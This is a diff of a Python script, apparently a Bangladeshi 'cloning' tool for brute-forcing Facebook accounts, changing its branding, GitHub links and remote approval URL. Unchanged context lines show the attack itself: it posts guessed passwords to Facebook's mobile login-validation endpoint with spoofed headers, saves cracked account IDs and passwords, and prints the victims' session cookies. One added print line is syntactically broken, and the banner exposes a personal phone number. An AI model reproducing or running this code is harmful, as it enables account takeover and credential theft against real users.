@@ -33,10 +33,7 @@ print('\033[91;1m[\x1b[31;5;50m+\033[91;1m] \x1b[31;5;50mUPDATE VERSHON 0.1...! 
 os.system("espeak -a 300 \"UPDATE VERSION 0.1,\"")
 time.sleep(2)
 #os.system('clear')
-print("\033[95;1m[\x1b[35;5;50m+\033[97;1m]\x1b[35;5;50m SUBSCRIBE MY YOUTUBE CHANNEL..!")
-os.system("espeak -a 300 \"SUBSCRIBE,MY,YOUTUBE,CHANNEL,\"")
-time.sleep(2)
-os.system(f'xdg-open https://https://youtube.com/@bastehoilejantehobe?si=GNfEpJDEmqkP7zOD')
+print("\033[95;1m[\x1b[35;5;50m+\033[97;1m]\x1b[35;5;50m
 os.system(f'xdg-open https://www.facebook.com/MOSABBIR2025')
 
 ua = ["Mozilla/5.0 (Linux; Android 11; 2107113SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36",]
@@ -1292,7 +1289,7 @@ cokbrut=[]
 ses=requests.Session()
 prinCP=[]
 try:
-    prox= requests.get('https://raw.githubusercontent.com/MOSABBIR90v/Approval/main/Approval.txt').text
+    prox= requests.get('https://raw.githubusercontent.com/Mosabbir404/Approval/main/Approval.txt').text
     open('.prox.txt','w').write(prox)
 except Exception as e:
     pass
@@ -1534,7 +1531,7 @@ def uaku():
         for ub in ua:
             ugen.append(ub)
     except:
-        a=requests.get('https://raw.githubusercontent.com/MOSABBIR90v/Approval/main/Approval.txt').text
+        a=requests.get('https://raw.githubusercontent.com/Mosabbir404/PRO/Approval/main/Approval.txt').text
         ua=open('bbnew.txt','w')
         aa=re.findall('line">(.*?)<',str(a))
         for un in aa:
@@ -1645,9 +1642,9 @@ logo ="""
  | |  | | (_) \__ \ (_| | |_) | |_) | | |   
  |_|  |_|\___/|___/\__,_|_.__/|_.__/|_|_|   v0.1
 \x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆
-\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46m𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 \033[1;31m● \x1b[38;5;46m𝗔𝗦𝗛𝗜𝗞 / 𝗚𝗔𝗟𝗔𝗫𝗬 𝟵𝟬𝗫
-\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46m𝗚𝗜𝗧𝗛𝗨𝗕    \033[1;31m● \x1b[38;5;46m𝗵𝘁𝘁𝗽𝘀://𝗴𝗶𝘁𝗵𝘂𝗯.𝗰𝗼𝗺/𝗴𝗮𝗹𝗮𝘅𝘆𝟵𝟬𝘃
-\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46m𝗩𝗘𝗥𝗦𝗜𝗢𝗡  \033[1;31m ● \x1b[38;5;46m𝟵.𝟭
+\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46m𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 \033[1;31m● \x1b[38;5;46mMOSABBIR /01790538366
+\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46m𝗚𝗜𝗧𝗛𝗨𝗕    \033[1;31m● \x1b[38;5;46m𝗵𝘁𝘁𝗽𝘀://𝗴𝗶𝘁𝗵𝘂𝗯.𝗰𝗼𝗺/mosabbir404
+\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46m𝗩𝗘𝗥𝗦𝗜𝗢𝗡  \033[1;31m ● \x1b[38;5;46m0.𝟭
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46m𝗧𝗢𝗢𝗟𝗦  \033[1;31m   ● \x1b[38;5;46m𝗙𝗥𝗘𝗘 𝗙𝗜𝗥𝗘, 𝗧𝗜𝗞𝗧𝗢𝗞, 𝗢𝗡𝗟𝗬 𝟭𝟬𝟬%
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46m𝗧𝗬𝗣𝗘  \033[1;31m    ● \x1b[38;5;46m𝗣𝗔𝗜𝗗
 \x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆"""
@@ -1771,7 +1768,7 @@ def menu():
     elif WASIM in ['1']:
         crack_file()
     elif WASIM in ['2','02']:
-        os.system('xdg-open https://github.com/MOSABBIR90v')
+        os.system('xdg-open https://github.com/mosabbir404')
         os.system("python nono.py")
     elif WASIM in ['3','03']:
         result()
@@ -1909,7 +1906,7 @@ def result():
 def crack_file():
     print('\033[0;93m==================')
     os.system('espeak -a 300 " your file name"')
-    print('\033[1;36m[ 𝗣𝗨𝗧 𝗙𝗜𝗟𝗘 𝗘𝗫𝗔𝗠𝗣𝗟𝗘:  /sdcard/MOSABBIR.txt ]')
+    print('\033[1;36m[ 𝗣𝗨𝗧 𝗙𝗜𝗟𝗘 𝗘𝗫𝗔𝗠𝗣𝗟𝗘:  /sdcard/mosabbir.txt ]')
     o = input('\033[95;1m[\033[92;1m+\033[95;1m] 𝗜𝗡𝗣𝗨𝗧 𝗙𝗜𝗟𝗘 𝗡𝗔𝗠𝗘 :\033[95;1m ')
     try:lin = open(o).read().splitlines()
     except:
@@ -1927,7 +1924,7 @@ def setting():
     print('\033[0;91m=============================')
     print("\033[95;1m[\033[95;1m1\033[95;1m] \033[0;95m𝗖𝗟??𝗡𝗜𝗡𝗚 𝗙𝗢𝗥 𝗢𝗡𝗟𝗬 𝗢𝗟𝗗 𝗜𝗗𝗭")
     print("\033[98;1m[\033[98;1m2\033[98;1m] \033[0;98m𝗖𝗟𝗢𝗡𝗜𝗡𝗚 𝗙𝗢𝗥 𝗢𝗡𝗟𝗬 𝗡𝗘𝗪 𝗜𝗗𝗭")
-    print("\033[91;1m[\033[91;1m3\033[91;1m] \033[0;91m𝗖𝗟𝗢𝗡𝗜𝗡𝗚 𝗙𝗢𝗥𝗠𝗜𝗫 𝗜𝗗𝗭")
+    print("\033[91;1m[\033[91;1m3\033[91;1m] \033[0;91m𝗖𝗟𝗢𝗡𝗜𝗡𝗚 𝗙𝗢𝗥 𝗠𝗜𝗫 𝗜𝗗𝗭")
     print('\033[0;91m=============================')
     hu = input('\033[95;1m[\033[92;1m+\033[95;1m]𝗖𝗛𝗢𝗢𝗦𝗘 :\033[95;1m ')
     if hu in ['1','01']:
@@ -2086,7 +2083,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r\033[100;95m{bo}[𝗚-Mosabbirpro•𝗠𝟭]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
+    sys.stdout.write(f"\r\033[100;95m{bo}[Mosabbir~PRO•𝗠𝟭]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -2103,7 +2100,7 @@ def crack(idf,pwv):
             heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[38;5;46m[𝗚-Mosabbirpro-𝗖𝗣🔒]𝗨𝗜𝗗┏━➤ {idf} 𝗣𝗮𝘀𝘀┏━➤{pw}')
+                print(f'\r\033[38;5;46m[Mosabbir-PRO-𝗖𝗣🔒]𝗨𝗜𝗗┏━➤ {idf} 𝗣𝗮𝘀𝘀┏━➤{pw}')
                 os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
@@ -2113,7 +2110,7 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[38;5;46m[𝗚-Mosabbirpro-𝗢𝗞🔓] 𝗨𝗜𝗗┏━➤ {idf} 𝗣𝗮𝘀𝘀┏━➤ {pw}\n\033[0;91m[🍪]= 𝗖𝗢𝗢𝗞𝗜𝗘𝗦 • \033[0;91m{kuki} ')
+                print(f'\r\033[38;5;46m[Mosabbir~PRO-𝗢𝗞🔓] 𝗨𝗜𝗗┏━➤ {idf} 𝗣𝗮𝘀𝘀┏━➤ {pw}\n\033[0;91m[🍪]= 𝗖𝗢𝗢𝗞𝗜𝗘𝗦 • \033[0;91m{kuki} ')
                 os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
